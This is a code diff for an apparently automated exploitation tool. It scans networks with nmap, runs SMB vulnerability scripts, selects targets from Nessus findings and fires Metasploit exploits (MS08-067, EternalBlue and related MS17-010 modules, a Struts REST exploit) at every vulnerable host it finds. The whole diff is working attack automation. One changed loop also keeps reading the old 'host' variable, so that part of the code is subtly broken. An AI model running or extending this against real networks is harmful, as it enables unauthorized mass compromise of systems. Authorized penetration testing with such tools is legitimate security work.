@@ -65,14 +65,14 @@ def get_exploitable_hosts(report):
             vuln_info = x.get_vuln_info
             severity = x.severity
             if int(severity) > 2:
-                if vuln_info.get('exploit_framework_metasploit'):
+                if 'exploit_framework_metasploit' in vuln_info:
                     if vuln_info['exploit_framework_metasploit'] == 'true':
                         ip = i.address
                         port = vuln_info['port']
                         msf_mod = vuln_info['metasploit_name']
                         print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))
 
-                        if exploits.get(msf_mod):
+                        if msf_mod in exploits:
                             exploits[msf_mod].append((operating_sys, ip, port))
                         else:
                             exploits[msf_mod] = [(operating_sys, ip, port)]
@@ -109,7 +109,7 @@ def parse_nmap(args):
                     print_bad('Error importing host list file. Are you sure you chose the right file?')
                     sys.exit()
 
-        report = nmap_scan(hosts, args.nmap_args)
+        report = nmap_scan(hosts, 'autopwn-scan', args.nmap_args)
 
     else:
         print_bad('Specify hostlist with: -l <hostlist.txt>')
@@ -117,17 +117,16 @@ def parse_nmap(args):
 
     return report
 
-def nmap_scan(hosts, add_args):
+def nmap_scan(hosts, outfile, add_args):
     '''
     Do Nmap scan
     '''
-    #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
-    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA autopwn-scan'.format(add_args)
+    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA {}'.format(add_args, outfile)
     print_info('Running: nmap {}'.format(nmap_args))
     nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
     rc = nmap_proc.sudo_run_background()
     nmap_status_printer(nmap_proc)
-    report = NmapParser.parse_fromfile(os.getcwd()+'/autopwn-scan.xml')
+    report = NmapParser.parse_fromfile(os.getcwd()+'/{}.xml'.format(outfile))
 
     return report
 
@@ -146,7 +145,19 @@ def nmap_status_printer(nmap_proc):
 
         time.sleep(1)
 
-def get_hosts(report):
+def get_nmap_os(host):
+    '''
+    Gets Nmap's guess of OS
+    '''
+    nmap_os_raw = host.os_class_probabilities()
+    if len(nmap_os_raw) > 0:
+        nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
+    else:
+        # Default to Windows
+        nmap_os = 'Nmap unable to guess OS; defaulting to Windows'
+    return nmap_os
+
+def get_hosts(report, nse):
     '''
     Prints host data
     '''
@@ -156,15 +167,12 @@ def get_hosts(report):
     for host in report.hosts:
         if host.is_up():
             ip = host.address
-            nmap_os_raw = host.os_class_probabilities()
 
-            if len(nmap_os_raw) > 0:
-                nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
-            else:
-                # Default to Windows
-                nmap_os = '?'
+            nmap_os = get_nmap_os(host)
 
-            print_info('{} - {}'.format(ip, nmap_os))
+            if nse == False:
+                print_info('{} - OS: {}'.format(ip, nmap_os))
+
             for s in host.services:
                 if s.open():
 
@@ -177,11 +185,15 @@ def get_hosts(report):
                         banner = s.banner
 
                     port = str(s.port)
-                    print '          {} - {}'.format(port, banner)
 
-    if len(hosts) == 0:
-        print_bad('No hosts found')
-        sys.exit()
+                    if nse == False:
+                        print '          {} - {}'.format(port, banner)
+
+
+    if nse == False:
+        if len(hosts) == 0:
+            print_bad('No hosts found')
+            sys.exit()
 
     return hosts
 
@@ -284,18 +296,17 @@ def run_console_cmd(c_id, cmd):
 def get_req_opts(c_id, module):
     req_opts = []
     opts = CLIENT.call('module.options', [c_id, module])
-    print_info('Required options:')
     for opt_name in opts:
-        if opts[opt_name].get('required'):
+        if 'required' in opts[opt_name]:
             if opts[opt_name]['required'] == True:
                 if 'default' not in opts[opt_name]:
                     req_opts.append(opt_name)
-                    print('    {}'.format(opt_name))
     return req_opts
 
 def get_rhost_var(c_id, module):
     req_opts = get_req_opts(c_id, module)
     for o in req_opts:
+        # Just handle the one req opt I can find that we might use that's not RHOST(S)
         if 'RHOST' in o:
             return o
     print_bad('Could not get RHOST var')
@@ -319,7 +330,7 @@ def get_payload(module, operating_sys):
 
     payloads = CLIENT.call('module.compatible_payloads',[module])
 
-    if payloads.get('error'):
+    if 'error' in payloads:
         if 'auxiliary' not in module:
             print_bad('Error getting payload for {}'.format(module))
         else:
@@ -416,11 +427,67 @@ def run_nessus_exploits(c_id, exploits):
             print_info('Checking if host is vulnerable...')
             output = run_if_vuln(c_id, cmd)
 
-def run_nmap_exploits(c_id, hosts):
+def get_nse_scripts(hosts):
+    nse_scripts = {}
+
+    for host in hosts:
+        ip = host.address
+        nmap_os = get_nmap_os(host)
+        if 'windows' in nmap_os.lower():
+            os_type = 'windows'
+        else:
+            os_type = 'nix'
+
+        for s in host.services:
+            if s.open():
+                port = str(s.port)
+                ip_port = ip+":"+port
+
+                # Run SMB vuln scripts
+                if s.port == 445 and os_type == 'windows':
+                    port = str(s.port)
+                    smb_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']
+                    if ip in nse_scripts:
+                        nse_scripts[ip][port] = smb_scripts
+                    else:
+                        nse_scripts[ip] = {port:smb_scripts}
+                # Run HTTP scripts
+                elif 'http' in s.service:
+                    http_scripts = ['http-title']
+                    if ip in nse_scripts:
+                        nse_scripts[ip][port] = http_scripts
+                    else:
+                        nse_scripts[ip] = {port:http_scripts}
+    return nse_scripts
+
+def run_nse_scripts(nse_scripts):
+    '''
+    We only run nse scripts after we know its possibly vuln
+    '''
+    # nse_scripts = {'ip':{'port':['script1', 'script2']}}
+    hosts_lst = []
+    ports_lst = []
+    scripts_lst = []
+
+    for ip in nse_scripts:
+        hosts_lst.append(ip)
+        for port in nse_scripts[ip]:
+            ports_lst.append(port)
+            for scripts in nse_scripts[ip][port]:
+                scripts_lst.append(scripts)
+
+    ports = ','.join(list(set(ports_lst)))
+    scripts = ','.join(list(set(scripts_lst)))
+
+    report = nmap_scan(hosts_lst, 'nse-scan', '-p {} --script {}'.format(ports, scripts))
+
+    return report
+
+def run_nmap_exploits(c_id, hosts, nse_hosts):
     '''
     Checks for exploitable services on a host
     '''
-    for host in hosts:
+    for host in nse_hosts:
         # First check for ms08_067 and ms17_010
         ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
         ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
@@ -429,11 +496,12 @@ def run_nmap_exploits(c_id, hosts):
         if ms17_vuln == True:
             mod_output = run_ms17(c_id, host)
 
+    for h in hosts:
         for s in host.services:
             if s.open():
                 if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
                     port = str(s.port)
-                    mod_output = run_struts_dmi_rest_exec(c_id, host, port)
+                    mod_output = run_struts_dmi_rest_exec(c_id, h, port)
 
 def run_if_vuln(c_id, cmd):
     is_vulnerable = check_vuln(c_id)
@@ -448,7 +516,7 @@ def run_struts_dmi_rest_exec(c_id, host, port):
     ip = host.address
     rhost_var = get_rhost_var(c_id, path)
     opts = ''
-    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
+    nmap_os = get_nmap_os(host)
     payload = get_payload(path, nmap_os)
     cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
     settings_out = run_console_cmd(c_id, cmd)
@@ -462,7 +530,7 @@ def run_ms08(c_id, host):
     '''
     path = 'exploit/windows/smb/ms08_067_netapi'
     ip = host.address
-    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
+    nmap_os = get_nmap_os(host)
     port = '445'
     rhost_var = get_rhost_var(c_id, path)
     opts = ''
@@ -477,14 +545,10 @@ def run_ms17(c_id, host):
     '''
     Exploit ms17_010
     '''
-    ip = host.address
-    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
-    port = '445'
-    rhost_var = get_rhost_var(c_id, path)
-    opts = ''
-
     # Check for named pipe availability (preVista you could just grab em)
     # If we find one, then use Romance/Synergy instead of Blue
+    ip = host.address
+    nmap_os = get_nmap_os(host)
     named_pipe = None
     named_pipes = check_named_pipes(c_id, ip, nmap_os)
 
@@ -500,11 +564,15 @@ def run_ms17(c_id, host):
         path = 'exploit/windows/smb/ms17_010_eternalblue'
         opts = 'set MaxExploitAttempts 6'
 
+    port = '445'
+    opts = ''
+    rhost_var = get_rhost_var(c_id, path)
     payload = get_payload(path, nmap_os)
     cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
     settings_out = run_console_cmd(c_id, cmd)
     print_info('Checking if host is vulnerable...')
     output = run_if_vuln(c_id, cmd)
+
     return output
 
 def print_cur_output(c_id):
@@ -572,8 +640,11 @@ def main(report, args):
         remainder_output = wait_on_busy_console(c_id)
     else:
         # hosts = {ip : [(port, banner), (port2, banner2)]
-        hosts = get_hosts(report)
-        run_nmap_exploits(c_id, hosts)
+        hosts = get_hosts(report, False)
+        nse_scripts = get_nse_scripts(hosts)
+        nse_report = run_nse_scripts(nse_scripts)
+        nse_hosts = get_hosts(nse_report, True)
+        run_nmap_exploits(c_id, hosts, nse_hosts)
         remainder_output = wait_on_busy_console(c_id)
 
 if __name__ == "__main__":
@@ -588,5 +659,6 @@ if __name__ == "__main__":
     main(report, args)
 
 #TODO
+# Make Nmap smarter so it only runs NSE scripts that haven't already been ran
+# Add tomcat_enum parser
 # Add JBoss, Struts, Tomcat, Jenkins, WebSphere
-# Add nmap script scan only after port is found
